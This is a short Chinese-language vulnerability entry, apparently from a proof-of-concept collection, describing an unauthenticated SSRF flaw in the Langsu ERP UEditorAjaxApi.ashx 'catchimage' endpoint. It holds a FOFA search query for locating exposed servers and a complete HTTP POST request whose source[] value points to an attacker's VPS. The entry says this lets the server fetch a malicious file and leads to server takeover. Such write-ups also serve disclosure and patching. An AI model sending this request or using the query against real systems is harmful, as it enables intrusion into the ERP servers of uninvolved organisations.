# 朗速ERP系统接口UEditorAjaxApi.ashx存在SSRF漏洞

朗速ERP UEditorAjaxApi.ashx 接口存在SSRF漏洞,未经身份验证的远程攻击者可以利用该漏洞在VPS上构造恶意文件，使服务器访问并下载文件到本地，进而控制服务器权限。

## fofa
```javascript
body="/Resource/Scripts/Yw/Yw_Bootstrap.js"
```

## poc
```javascript
POST /Api/UEditor/UEditorAjaxApi.ashx?method=catchimage HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/x-www-form-urlencoded; charset=utf-8
Connection: keep-alive

source[]=http://vpsip
```

![image-20250103185025413](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202501031850476.png)